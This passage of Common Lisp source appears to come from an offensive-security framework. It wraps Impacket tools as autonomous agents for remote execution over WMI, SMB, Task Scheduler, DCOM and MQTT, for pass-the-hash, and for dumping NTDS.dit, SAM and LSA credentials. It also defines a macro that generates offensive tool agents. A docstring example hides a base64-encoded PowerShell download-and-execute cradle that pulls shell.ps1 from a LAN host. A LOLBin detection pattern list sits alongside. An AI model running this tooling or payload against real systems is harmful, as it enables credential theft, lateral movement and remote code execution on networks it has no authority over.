(defun make-impacket-wmiexec-agent (target username &key password hashes
                                                           command
                                                           (namespace "//./root/cimv2")
                                                           no-output)
  "Create an Impacket wmiexec agent for WMI-based remote execution.

Parameters:
  TARGET    — Target host IP or hostname (required).
  USERNAME  — SMB username (required).
  PASSWORD  — Plaintext password (optional, use HASHES for PtH).
  HASHES    — NTLM hash string LMHASH:NTHASH for Pass-the-Hash.
  COMMAND   — Command to execute (default opens semi-interactive shell).
  NAMESPACE — WMI namespace (default \"//./root/cimv2\").
  NO-OUTPUT — If T, suppress output retrieval.

Returns: A configured IMPACKET-WMIEXEC-AGENT instance."
  (let* ((binary (or (find-kali-binary "wmiexec.py")
                     (warn "[IMPACKET] wmiexec.py not found. Install with: apt install python3-impacket")))
         (args (append
                (list (format nil "~A@~A" username target))
                (when password (list password))
                (when hashes (list "-hashes" hashes))
                (when command (list command))
                (unless (string= namespace "//./root/cimv2")
                  (list "-namespace" namespace))
                (when no-output (list "-no-output")))))
    (let ((agent (make-instance 'impacket-wmiexec-agent
                                :binary (or binary "wmiexec.py")
                                :args args
                                :tool-category :exploit
                                :target target
                                :username username
                                :password password
                                :hashes hashes
                                :command command
                                :namespace namespace
                                :no-output no-output
                                :capabilities '(:lateral-movement :wmi-exec
                                                :pass-the-hash :stealth-exec)
                                :timeout *impacket-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *impacket-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.2.3  impacket-secretsdump-agent — Credential extraction (NTDS/SAM/LSA)
;; ───────────────────────────────────────────────────────────────────────────

(defclass impacket-secretsdump-agent (kali-agent)
  ((target :initarg :target
           :accessor impacket-target)
   (username :initarg :username
             :accessor impacket-username)
   (password :initarg :password
             :accessor impacket-password)
   (hashes :initarg :hashes
           :accessor impacket-hashes)
   (ntds :initarg :ntds
         :initform nil
         :accessor impacket-ntds
         :documentation
         "If T, extract NTDS.dit hashes (Domain users' NTLM hashes).
            This is the crown jewel of domain credential extraction.")
   (sam :initarg :sam
        :initform nil
        :accessor impacket-sam
        :documentation
         "If T, extract SAM registry hive hashes (local accounts).")
   (security :initarg :security
             :initform nil
             :accessor impacket-security
             :documentation
         "If T, extract SECURITY registry hive (LSA secrets, cached creds).")
   (system :initarg :system
           :initform nil
           :accessor impacket-system
           :documentation
         "If T, extract SYSTEM registry hive (boot key for SAM/SECURITY decryption).")
   (history :initarg :history
            :initform nil
            :accessor impacket-history
            :documentation
         "If T, dump password history hashes from NTDS.")
   (output-file :initarg :output-file
                :initform nil
                :accessor impacket-output-file
                :documentation
         "Base filename for output files (.sam, .ntds, .security suffixes
            will be appended automatically)."))
  (:documentation
   "Impacket secretsdump — extract NTDS.dit, SAM, LSA secrets from Windows.

Secretsdump is one of the most powerful credential extraction tools in
Impacket. It remotely dumps:
  • NTDS.dit hashes      — Domain user NTLM hashes (the 'crown jewels')
  • SAM hashes           — Local account password hashes
  • LSA secrets          — Service account passwords, DPAPI keys
  • Cached credentials   — Domain cached credentials (mscache/mscache2)
  • Password history     — Previous password hashes (password analysis)

Authentication: Password-based or Pass-the-Hash.
Target: Must be a Domain Controller for NTDS.dit extraction, or any
Windows system for SAM/LSA secrets.

Extracted hashes can be fed into hashcat or john for offline cracking,
or used directly for Pass-the-Hash attacks.

Example:
  ;; Dump everything from a Domain Controller
  (make-impacket-secretsdump-agent \"dc01.corp.local\" \"CORP\\admin\"
    :password \"P@ssw0rd\"
    :ntds t :sam t :security t :history t
    :output-file \"/tmp/corp-dump\")

  ;; Pass-the-Hash to dump SAM only
  (make-impacket-secretsdump-agent \"192.168.1.10\" \"Administrator\"
    :hashes \"...\"
    :sam t)"))

(defun make-impacket-secretsdump-agent (target username &key password hashes
                                                              (ntds nil)
                                                              (sam nil)
                                                              (security nil)
                                                              (system nil)
                                                              (history nil)
                                                              output-file)
  "Create an Impacket secretsdump agent for credential extraction.

Parameters:
  TARGET      — Target host (DC for NTDS, any Windows for SAM/LSA).
  USERNAME    — Authentication username.
  PASSWORD    — Plaintext password (optional).
  HASHES      — NTLM hash for Pass-the-Hash (optional).
  NTDS        — If T, extract NTDS.dit domain hashes.
  SAM         — If T, extract SAM local account hashes.
  SECURITY    — If T, extract SECURITY hive (LSA secrets).
  SYSTEM      — If T, extract SYSTEM hive (boot key).
  HISTORY     — If T, dump password history.
  OUTPUT-FILE — Base path for output files (optional).

Returns: A configured IMPACKET-SECRETSDUMP-AGENT instance."
  (let* ((binary (or (find-kali-binary "secretsdump.py")
                     (warn "[IMPACKET] secretsdump.py not found. Install with: apt install python3-impacket")))
         (args (append
                (list (format nil "~A@~A" username target))
                (when password (list password))
                (when hashes (list "-hashes" hashes))
                (when ntds (list "-ntds"))
                (when sam (list "-sam"))
                (when security (list "-security"))
                (when system (list "-system"))
                (when history (list "-history"))
                (when output-file (list "-outputfile" output-file)))))
    (let ((agent (make-instance 'impacket-secretsdump-agent
                                :binary (or binary "secretsdump.py")
                                :args args
                                :tool-category :exploit
                                :target target
                                :username username
                                :password password
                                :hashes hashes
                                :ntds ntds
                                :sam sam
                                :security security
                                :system system
                                :history history
                                :output-file output-file
                                :capabilities '(:credential-extraction
                                                :ntds-dump :sam-dump
                                                :lsa-secrets :pass-the-hash)
                                :timeout *impacket-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *impacket-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.2.4  impacket-smbexec-agent — SMB pipe-based command execution
;; ───────────────────────────────────────────────────────────────────────────

(defclass impacket-smbexec-agent (kali-agent)
  ((target :initarg :target
           :accessor impacket-target)
   (username :initarg :username
             :accessor impacket-username)
   (password :initarg :password
             :accessor impacket-password)
   (hashes :initarg :hashes
           :accessor impacket-hashes)
   (command :initarg :command
            :accessor impacket-command)
   (mode :initarg :mode
         :initform :SERVER
         :accessor impacket-mode
         :documentation
         "Execution mode: :SERVER (creates local SMB server for output)
            or :SHARE (uses existing admin$ share for output)."))
  (:documentation
   "Impacket smbexec — execute commands via named SMB pipes.

Smbexec is an alternative to psexec that uses SMB named pipes for both
command input and output, rather than creating a Windows service.
It works by writing the command to a service file in an SMB share,
triggering execution via a control pipe, and reading output back
through another named pipe.

This approach is stealthier than psexec because:
  • No actual Windows service is created
  • All communication happens through SMB named pipes
  • Leaves minimal forensic artifacts

However, some advanced EDR solutions monitor named pipe creation and
may still detect this activity.

Example:
  (make-impacket-smbexec-agent \"192.168.1.10\" \"Administrator\"
    :password \"P@ssw0rd\"
    :command \"net user\"
    :mode :SERVER)"))

(defun make-impacket-smbexec-agent (target username &key password hashes
                                                            command
                                                            (mode :SERVER))
  "Create an Impacket smbexec agent for SMB pipe-based execution.

Parameters:
  TARGET   — Target host IP or hostname.
  USERNAME — SMB username.
  PASSWORD — Plaintext password (optional, use HASHES for PtH).
  HASHES   — NTLM hash for Pass-the-Hash.
  COMMAND  — Command to execute.
  MODE     — :SERVER (default, local SMB server) or :SHARE.

Returns: A configured IMPACKET-SMBEXEC-AGENT instance."
  (let* ((binary (or (find-kali-binary "smbexec.py")
                     (warn "[IMPACKET] smbexec.py not found. Install with: apt install python3-impacket")))
         (args (append
                (list (format nil "~A@~A" username target))
                (when password (list password))
                (when hashes (list "-hashes" hashes))
                (when command (list command))
                (when (eq mode :SHARE) (list "-share" "ADMIN$")))))
    (let ((agent (make-instance 'impacket-smbexec-agent
                                :binary (or binary "smbexec.py")
                                :args args
                                :tool-category :exploit
                                :target target
                                :username username
                                :password password
                                :hashes hashes
                                :command command
                                :mode mode
                                :capabilities '(:lateral-movement :smb-pipe-exec
                                                :pass-the-hash :stealth-exec)
                                :timeout *impacket-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *impacket-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.2.5  impacket-atexec-agent — Task Scheduler command execution
;; ───────────────────────────────────────────────────────────────────────────

(defclass impacket-atexec-agent (kali-agent)
  ((target :initarg :target
           :accessor impacket-target)
   (username :initarg :username
             :accessor impacket-username)
   (password :initarg :password
             :accessor impacket-password)
   (hashes :initarg :hashes
           :accessor impacket-hashes)
   (command :initarg :command
            :accessor impacket-command)
   (session :initarg :session
            :initform nil
            :accessor impacket-session
            :documentation
            "If T, maintain a persistent session across commands.
            Allows multiple commands without re-authenticating."))
  (:documentation
   "Impacket atexec — execute commands via Windows Task Scheduler.

Atexec uses the Windows Task Scheduler service (ATSVC or ITaskSchedulerService)
to execute commands remotely. It creates a one-time scheduled task that
runs immediately, captures output, and removes the task.

This method is particularly useful when:
  • SMB service creation is blocked (psexec fails)
  • WMI/DCOM is blocked (wmiexec fails)
  • Task Scheduler service is accessible (common in enterprise environments)

The tool uses MS-RPC interface (ATSVC pipe or ITaskSchedulerService)
to interact with the Task Scheduler.

Example:
  (make-impacket-atexec-agent \"192.168.1.10\" \"Administrator\"
    :password \"P@ssw0rd\"
    :command \"systeminfo\"
    :session t)"))

(defun make-impacket-atexec-agent (target username &key password hashes
                                                           command
                                                           (session nil))
  "Create an Impacket atexec agent for Task Scheduler-based execution.

Parameters:
  TARGET   — Target host IP or hostname.
  USERNAME — SMB username.
  PASSWORD — Plaintext password (optional).
  HASHES   — NTLM hash for Pass-the-Hash.
  COMMAND  — Command to execute.
  SESSION  — If T, maintain persistent session.

Returns: A configured IMPACKET-ATEXEC-AGENT instance."
  (let* ((binary (or (find-kali-binary "atexec.py")
                     (warn "[IMPACKET] atexec.py not found. Install with: apt install python3-impacket")))
         (args (append
                (list (format nil "~A@~A" username target))
                (when password (list password))
                (when hashes (list "-hashes" hashes))
                (when command (list command))
                (when session (list "-session")))))
    (let ((agent (make-instance 'impacket-atexec-agent
                                :binary (or binary "atexec.py")
                                :args args
                                :tool-category :exploit
                                :target target
                                :username username
                                :password password
                                :hashes hashes
                                :command command
                                :session session
                                :capabilities '(:lateral-movement :task-scheduler-exec
                                                :pass-the-hash :stealth-exec)
                                :timeout *impacket-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *impacket-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.2.6  impacket-dcomexec-agent — DCOM-based command execution
;; ───────────────────────────────────────────────────────────────────────────

(defclass impacket-dcomexec-agent (kali-agent)
  ((target :initarg :target
           :accessor impacket-target)
   (username :initarg :username
             :accessor impacket-username)
   (password :initarg :password
             :accessor impacket-password)
   (hashes :initarg :hashes
           :accessor impacket-hashes)
   (command :initarg :command
            :accessor impacket-command)
   (object :initarg :object
           :initform :MMC20
           :accessor impacket-dcom-object
           :documentation
           "DCOM object to use for execution:
            :MMC20   — MMC20.Application (default, most reliable)
            :SHELL   — ShellWindows
            :SHELLBROWSER — ShellBrowserWindow"))
  (:documentation
   "Impacket dcomexec — execute commands via DCOM (Distributed COM).

Dcomexec leverages DCOM objects on remote Windows systems to execute
commands. It activates a DCOM object (by default MMC20.Application),
uses its Document.ActiveView.ExecuteShellCommand method to run the
requested command, and captures output via an SMB admin share.

This technique is particularly effective because:
  • DCOM is widely used in enterprise Windows environments
  • Often allowed through firewalls that block raw SMB
  • Does not create services or use WMI (different detection surface)
  • Can bypass some application whitelisting solutions

The MMC20.Application object is the default because it provides a
clean ExecuteShellCommand method that accepts arbitrary command lines.

Example:
  (make-impacket-dcomexec-agent \"192.168.1.10\" \"CORP\\admin\"
    :password \"P@ssw0rd\"
    :command \"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA\"
    :object :MMC20)"))

(defun make-impacket-dcomexec-agent (target username &key password hashes
                                                            command
                                                            (object :MMC20))
  "Create an Impacket dcomexec agent for DCOM-based remote execution.

Parameters:
  TARGET   — Target host IP or hostname.
  USERNAME — SMB username (may include domain).
  PASSWORD — Plaintext password (optional).
  HASHES   — NTLM hash for Pass-the-Hash.
  COMMAND  — Command to execute.
  OBJECT   — DCOM object: :MMC20 (default), :SHELL, or :SHELLBROWSER.

Returns: A configured IMPACKET-DCOMEXEC-AGENT instance."
  (let* ((binary (or (find-kali-binary "dcomexec.py")
                     (warn "[IMPACKET] dcomexec.py not found. Install with: apt install python3-impacket")))
         (object-str (case object
                       (:SHELL "ShellWindows")
                       (:SHELLBROWSER "ShellBrowserWindow")
                       (t "MMC20.Application")))
         (args (append
                (list (format nil "~A@~A" username target))
                (when password (list password))
                (when hashes (list "-hashes" hashes))
                (unless (equalp object-str "MMC20.Application")
                  (list "-object" object-str))
                (when command (list command)))))
    (let ((agent (make-instance 'impacket-dcomexec-agent
                                :binary (or binary "dcomexec.py")
                                :args args
                                :tool-category :exploit
                                :target target
                                :username username
                                :password password
                                :hashes hashes
                                :command command
                                :object object
                                :capabilities '(:lateral-movement :dcom-exec
                                                :pass-the-hash :stealth-exec)
                                :timeout *impacket-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *impacket-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.2.7  impacket-samrdump-agent — SAMR domain enumeration
;; ───────────────────────────────────────────────────────────────────────────

(defclass impacket-samrdump-agent (kali-agent)
  ((target :initarg :target
           :accessor impacket-target)
   (username :initarg :username
             :initform nil
             :accessor impacket-username)
   (password :initarg :password
             :initform nil
             :accessor impacket-password)
   (hashes :initarg :hashes
           :initform nil
           :accessor impacket-hashes)
   (port :initarg :port
         :initform 445
         :accessor impacket-port
         :documentation
         "SMB port to connect to (default 445, use 139 for legacy)."))
  (:documentation
   "Impacket samrdump — enumerate users/groups via Security Account Manager Remote.

Samrdump connects to the SAMR (Security Account Manager Remote) RPC
interface on a Windows system and enumerates:
  • Local user accounts
  • Local group memberships
  • Account policies (password policy, lockout policy)
  • Domain trusts (when run against a DC)

This tool is invaluable for reconnaissance — it provides a wealth of
information about the target environment without requiring code execution.

When run without credentials (anonymous/null session), it attempts
to enumerate via null session. With credentials, it provides full
enumeration of all accounts and groups.

Example:
  ;; Anonymous enumeration (if null sessions enabled)
  (make-impacket-samrdump-agent \"192.168.1.10\")

  ;; Authenticated enumeration
  (make-impacket-samrdump-agent \"dc01.corp.local\" \"CORP\\admin\"
    :password \"P@ssw0rd\")"))

(defun make-impacket-samrdump-agent (target &key username password hashes
                                                  (port 445))
  "Create an Impacket samrdump agent for SAMR-based enumeration.

Parameters:
  TARGET   — Target host IP or hostname.
  USERNAME — Optional username for authenticated enumeration.
  PASSWORD — Optional plaintext password.
  HASHES   — Optional NTLM hash for Pass-the-Hash.
  PORT     — SMB port (default 445).

Returns: A configured IMPACKET-SAMRDUMP-AGENT instance."
  (let* ((binary (or (find-kali-binary "samrdump.py")
                     (warn "[IMPACKET] samrdump.py not found. Install with: apt install python3-impacket")))
         (args (append
                (list target)
                (when username (list (format nil "~A@~A" username target)))
                (when password (list password))
                (when hashes (list "-hashes" hashes))
                (unless (= port 445) (list "-port" (princ-to-string port))))))
    (let ((agent (make-instance 'impacket-samrdump-agent
                                :binary (or binary "samrdump.py")
                                :args (alexandria:flatten args)
                                :tool-category :recon
                                :target target
                                :username username
                                :password password
                                :hashes hashes
                                :port port
                                :capabilities '(:user-enumeration
                                                :group-enumeration
                                                :null-session
                                                :domain-recon)
                                :timeout *impacket-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *impacket-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.2.8  impacket-mqttexec-agent — MQTT-based command execution (IoT/Edge)
;; ───────────────────────────────────────────────────────────────────────────

(defclass impacket-mqttexec-agent (kali-agent)
  ((target :initarg :target
           :accessor impacket-target)
   (username :initarg :username
             :initform nil
             :accessor impacket-username)
   (password :initarg :password
             :initform nil
             :accessor impacket-password)
   (topic :initarg :topic
          :initform "cmd/exec"
          :accessor impacket-topic
          :documentation
          "MQTT topic to publish commands to (default \"cmd/exec\").
            The target IoT device must be subscribed to this topic.")
   (port :initarg :port
         :initform 1883
         :accessor impacket-port
         :documentation
         "MQTT broker port (default 1883 for unencrypted, 8883 for TLS)."))
  (:documentation
   "Impacket mqttexec — execute commands via MQTT protocol.

Mqttexec is part of the Impacket suite designed for IoT/edge device
scenarios where MQTT (Message Queuing Telemetry Transport) is used
for device management and command-and-control.

It publishes command messages to a configurable MQTT topic that the
target device is subscribed to. The device executes the command and
may publish output to a response topic.

This tool is particularly relevant for:
  • IoT penetration testing
  • Smart home/Building automation assessments
  • Industrial IoT (IIoT) security evaluations
  • MQTT broker security testing

WARNING: Default MQTT configurations often have no authentication.
Always test for anonymous access first.

Example:
  ;; Basic MQTT execution on default port
  (make-impacket-mqttexec-agent \"iot-broker.local\" \"device001\"
    :topic \"devices/cmd\"
    :port 1883)

  ;; With MQTT authentication
  (make-impacket-mqttexec-agent \"192.168.1.50\" \"admin\"
    :password \"mqttpass\"
    :topic \"factory/line1/cmd\"
    :port 8883)"))

(defun make-impacket-mqttexec-agent (target username &key password
                                                            (topic "cmd/exec")
                                                            (port 1883))
  "Create an Impacket mqttexec agent for MQTT-based command execution.

Parameters:
  TARGET   — MQTT broker host IP or hostname.
  USERNAME — MQTT username (optional, many brokers allow anonymous).
  PASSWORD — MQTT password (optional).
  TOPIC    — MQTT topic for command publishing (default \"cmd/exec\").
  PORT     — MQTT broker port (default 1883).

Returns: A configured IMPACKET-MQTTEXEC-AGENT instance."
  (let* ((binary (or (find-kali-binary "mqttexec.py")
                     (warn "[IMPACKET] mqttexec.py not found. Install with: apt install python3-impacket")))
         (args (append
                (list target)
                (when username (list username))
                (when password (list password))
                (unless (equalp topic "cmd/exec") (list "-topic" topic))
                (unless (= port 1883) (list "-port" (princ-to-string port))))))
    (let ((agent (make-instance 'impacket-mqttexec-agent
                                :binary (or binary "mqttexec.py")
                                :args (alexandria:flatten args)
                                :tool-category :exploit
                                :target target
                                :username username
                                :password password
                                :topic topic
                                :port port
                                :capabilities '(:iot-exec :mqtt-c2
                                                :edge-device :iot-recon)
                                :timeout *impacket-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *impacket-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))




;; ═══════════════════════════════════════════════════════════════════════════
;; OFFENSIVE TOOL REGISTRY — v2.3.1 Massive Integration
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; The DEFINE-OFFENSIVE-TOOL macro generates kali-agent subclasses,
;; run-tool methods, parse-findings stubs, and MCP registrations
;; from a concise manifest entry.
;;
;; "From a single form, a hundred classes. From a manifest, an army."
;; ═══════════════════════════════════════════════════════════════════════════

;; ─────────────────────────────────────────────────────────────────────────
;; Section A: Special Variables for the Offensive Tool Registry
;; ─────────────────────────────────────────────────────────────────────────

(defvar *offensive-tool-registry* (make-hash-table :test 'eq)
  "Registry of all offensive tool agents generated by DEFINE-OFFENSIVE-TOOL.

Keys are the tool name symbols (e.g., 'certutil, 'mimikatz).
Values are property lists containing:
  :class-name     — the generated agent class symbol (e.g., certutil-agent)
  :binary-path    — absolute path to the system binary
  :category       — tool category keyword (:lolbin :creds :lateral etc.)
  :default-args   — list of default command-line arguments
  :requires-root  — boolean, whether the tool needs elevated privileges
  :output-format  — :text, :json, or :xml (guides parse-findings behavior)
  :parsers        — list of custom parser function symbols
  :description    — human-readable description string
  :loaded-p       — boolean, whether the agent class has been defined

This registry is the central catalog of every offensive tool known to
LISPMIND. It is populated at macro-expansion time by DEFINE-OFFENSIVE-TOOL
and at load time by LOAD-TOOL-SUITE.

Thread-safety: Protected by *offensive-tool-registry-lock*.

See also: *offensive-tool-manifest*, list-loaded-tools, list-tools-by-category.")

(defvar *offensive-tool-registry-lock* (bt:make-lock "offensive-tool-registry")
  "Lock protecting *offensive-tool-registry* and *loaded-tool-categories*.

Acquired by:
  • register-offensive-tool    — when adding a tool to the registry
  • load-tool-suite            — when bulk-loading tool categories
  • list-loaded-tools          — when enumerating loaded tools
  • list-tools-by-category     — when filtering by category")

(defvar *loaded-tool-categories* '()
  "List of category keywords that have been loaded.

Each call to LOAD-TOOL-SUITE pushes newly loaded categories onto this
list. Used by list-loaded-tools to provide a quick overview of what
tool suites are available without querying the full registry.

Categories: :lolbin :creds :lateral :post-exploit :web :recon
            :social-engineering :wireless")

(defvar *lolbin-suspicious-patterns*
  '((:certutil . ("urlcache" "split" "f" "http" "https" "ftp"))
    (:bitsadmin . ("transfer" "addfile" "setnotifycmdline" "create"))
    (:mshta . ("javascript" "vbscript" "http" "about"))
    (:rundll32 . ("javascript" "Invoke_Registration" "shell32" "advpack"))
    (:regsvr32 . ("scrobj" "i" "u" "n" "http"))
    (:wmic . ("process" "call" "create" "node" "/user:" "/password:"))
    (:cscript . ("http" "ftp" "script" ".js" ".vbs" ".hta"))
    (:powershell . ("-enc" "-encodedcommand" "iex" "invoke-expression"
                    "downloadstring" "net.webclient" "frombase64"))
    (:installutil . ("/logfile=" "/u" "http" "powershell"))
    (:msbuild . ("http" ".csproj" ".xml" "task" "code"))
    (:regsvcs . ("codebase" "http" "/c"))
    (:regasm . ("unregister" "codebase" "http" "/c"))
    (:control . ("inf" "add" "http" "\\"))
    (:esentutl . ("/vss" "/m" "/d" "\windows\ntds" "sam" "system"))
    (:forfiles . ("/c" "cmd" "powershell" "/p" "/m"))
    (:sc . ("create" "binpath=" "config=" "start="))
    (:schtasks . ("/create" "/tr" "/ru" "/sc" "/tn" "powershell" "cmd"))
    (:winrm . ("quickconfig" "invoke" "create" "winrs"))
    (:wsl . ("-e" "-u" "--exec" "whoami" "cmd" "powershell"))
    (:certreq . ("-post" "-config" "-attrib" "http" "cacert"))
    (:desktopimgdownldr . ("lockscreenurl" "http" "https"))
    (:eventvwr . ())
    (:fodhelper . ())
    (:computerdefaults . ())
    (:slui . ())
    (:tracker . ("/d" "/c" "cmd" "powershell"))
    (:pcalua . ("-a" "-p" "\\" "http" "cmd")))
  "Alist of LOLBin names to lists of suspicious argument patterns.

These patterns are used by DETECT-LOLBIN-SUSPICIOUS-ACTIVITY to flag
potentially malicious command-line usage of Living-Off-The-Land binaries.
Each pattern is a string that, when found in a command line, raises the
suspicion score for that invocation.

The patterns are sourced from MITRE ATT&CK techniques T1105, T1218,
T1216, T1059, and LOLBAS project entries. They represent known
adversarial abuse patterns rather than benign administrative usage.

Usage:
  (cdr (assoc :certutil *lolbin-suspicious-patterns*))
    => (\"urlcache\" \"split\" \"f\" \"http\" \"https\" \"ftp\")

See also: detect-lolbin-suspicious-activity, score-lolbin-command.")

;; ─────────────────────────────────────────────────────────────────────────
;; Section B: The DEFINE-OFFENSIVE-TOOL Macro (THE CROWN JEWEL)
;; ─────────────────────────────────────────────────────────────────────────

(defmacro define-offensive-tool (name &key binary-path category
                                         default-args
                                         (requires-root nil)
                                         (output-format :text)
                                         (parsers nil)
                                         (description ""))
  "Define an offensive tool as a kali-agent subclass with full method suite.

This is the crown jewel of LISPMIND's code generation system. A single
form expands into eight definitions:

1. DEFCLASS    — <name>-agent subclass of kali-agent with tool metadata
2. DEFMETHOD   — run-tool :before adding sudo wrapper if requires-root
3. DEFMETHOD   — parse-findings :after stub for custom parsing
4. DEFMETHOD   — tool-category returning the category keyword
5. DEFMETHOD   — tool-binary-path returning the binary path
6. DEFUN       — make-<name>-agent constructor function
7. DEFMETHOD   — finalize-agent :after for process cleanup
8. REGISTRY    — Gossip topic registration on tool spawn

Parameters:
  NAME          — Symbol naming the tool (e.g., 'certutil, 'mimikatz).
                  The generated class will be named <name>-agent.
  :BINARY-PATH  — String, absolute path to the system binary.
                  Example: \"/usr/bin/certutil\"
  :CATEGORY     — Keyword classifying the tool domain.
                  One of: :lolbin :creds :lateral :post-exploit
                          :web :recon :social-engineering :wireless
  :DEFAULT-ARGS — List of strings passed to the binary on every run.
                  Example: '(\"-urlcache\" \"-split\")
  :REQUIRES-ROOT — Boolean, if T the run-tool :before method wraps
                  invocation in sudo. Default NIL.
  :OUTPUT-FORMAT — :text, :json, or :xml. Guides parse-findings.
                  Default :text.
  :PARSERS      — List of custom parser function symbols for specialized
                  output handling. Default NIL.
  :DESCRIPTION  — Human-readable description for documentation.

Macro Expansion Details:
  Each invocation of DEFINE-OFFENSIVE-TOOL produces approximately 120
  lines of expanded code across the eight definition forms. At compile
  time, the macro:

  1. Constructs the class name as (symbol-name name) + \"-AGENT\"
  2. Generates slot definitions inheriting from kali-agent
  3. Emits a run-tool :before method that optionally prepends sudo
  4. Creates a parse-findings :after stub that parser authors can refine
  5. Defines accessor methods for tool-category and binary-path
  6. Generates a make-<name>-agent constructor with &key parameters
  7. Adds a finalize-agent :after method for clean process teardown
  8. Registers the tool in *offensive-tool-registry*

Example:
  (define-offensive-tool certutil
    :binary-path \"/usr/bin/certutil\"
    :category :lolbin
    :default-args '(\"-urlcache\" \"-split\")
    :requires-root nil
    :output-format :text
    :description \"Windows LOLBin for downloading and caching certificates\")

Generates: certutil-agent class + all methods + make-certutil-agent function.

See also: *offensive-tool-manifest*, load-tool-suite, list-loaded-tools."
  (let* ((agent-class (intern (format nil "~A-AGENT" (symbol-name name))
                              (symbol-package name)))
         (constructor (intern (format nil "MAKE-~A-AGENT" (symbol-name name))
                              (symbol-package name)))
         (category-sym category)
         (binary-sym binary-path)
         (root-p requires-root)
         (format-sym output-format)
         (parser-list parsers)
         (desc description))
    `(progn
       ;; ── 1. Agent Class Definition ──────────────────────────────────
       (defclass ,agent-class (kali-agent)
         ((tool-name :initform ',name
                     :reader agent-tool-name
                     :documentation
                     ,(format nil "Symbol naming this tool: ~A.~%
                               Set at class definition time by the~%
                               DEFINE-OFFENSIVE-TOOL macro."
                              name))
          (lolbin-p :initform ,(eq category-sym :lolbin)
                    :reader agent-lolbin-p
                    :documentation
                    "Boolean: T if this tool is a Living-Off-The-Land~%
                     binary (LOLBin). Set by the category parameter~%
                     of DEFINE-OFFENSIVE-TOOL. LOLBins receive~%
                     additional scrutiny from the suspicious-activity~%
                     detector."))
         (:documentation
          ,(format nil "Offensive tool agent for ~A (~A).~%~A~%~%
                       Generated automatically by DEFINE-OFFENSIVE-TOOL.~%
                       Category: ~A | Binary: ~A | Requires root: ~A"
                   (string-capitalize (symbol-name name))
                   category-sym
                   (if (string= desc "")
                       ""
                       (format nil "~A~%" desc))
                   category-sym binary-sym root-p)))

       ;; ── 2. run-tool :before — sudo wrapper if requires-root ────────
       ,(when root-p
          `(defmethod run-tool :before ((agent ,agent-class) &rest extra-args)
             "Prepend sudo to the binary invocation for root-requiring tools.

This :before method fires before the primary run-tool on kali-agent.
It mutates the agent's binary slot to reference the sudo-wrapped
command, then proceeds to the primary method which launches normally.

SECURITY NOTE: This assumes the user has passwordless sudo configured
for the target binary, OR that a sudo credential cache is active. In
autonomous mode, a sudo password prompt will hang indefinitely."
             (declare (ignore extra-args))
             (let ((original-binary (agent-binary agent)))
               (setf (agent-binary agent)
                     (format nil "sudo ~A" original-binary))
               (log-message :info "[OFFENSIVE-TOOL] Elevating ~A with sudo"
                            ',name))))

       ;; ── 3. parse-findings :after — stub for custom parsing ────────
       (defmethod parse-findings :after ((agent ,agent-class) line)
         ,(format nil "Post-process a line of output from ~A.~%~%
                   This :after method fires after the primary~%
                   parse-findings on kali-agent. It provides a hook~%
                   for tool-specific parsing that goes beyond the~%
                   generic parser. By default it does nothing;~%
                   redefine or extend this method to add custom~%
                   finding extraction for ~A.~%~%
                   Parameters:~%
                     AGENT — The ~A instance.~%
                     LINE  — One line of output from the tool."
                  (string-capitalize (symbol-name name))
                  (string-capitalize (symbol-name name))
                  agent-class)
         ;; Stub: no-op by default. Custom parsers go here.
         ;; The primary method on kali-agent handles generic parsing.
         ;; This :after method catches anything missed by the primary.
         (declare (ignorable line))
         nil)

       ;; ── 4. tool-category accessor ──────────────────────────────────
       (defmethod tool-category ((agent ,agent-class))
         ,(format nil "Return the category keyword for this ~A agent.~%~%
                   Returns ~A, indicating this tool belongs to the~%
                   ~:*~A category of offensive tools."
                  (string-capitalize (symbol-name name))
                  category-sym)
         ',category-sym)

       ;; ── 5. tool-binary-path accessor ───────────────────────────────
       (defmethod tool-binary-path ((agent ,agent-class))
         ,(format nil "Return the filesystem path to the ~A binary.~%~%
                   Returns \"~A\"."
                  (string-capitalize (symbol-name name))
                  binary-sym)
         ,binary-sym)

       ;; ── 6. Constructor function ────────────────────────────────────
       (defun ,constructor (&key (args ',default-args) (target nil) (timeout *kali-default-timeout*))
         ,(format nil "Create a new ~A agent with the specified parameters.~%~%
                   Parameters:~%
                     :ARGS    — List of command-line argument strings.~%
                                Default: ~S~%
                     :TARGET  — Target host, IP, or file path.~%
                                Default: NIL~%
                     :TIMEOUT — Execution timeout in seconds.~%
                                Default: *kali-default-timeout*~%~%
                   Returns: A ~A instance, ready for run-tool.~%~%
                   Example:~%
                     (~A :target \"192.168.1.1\"~%
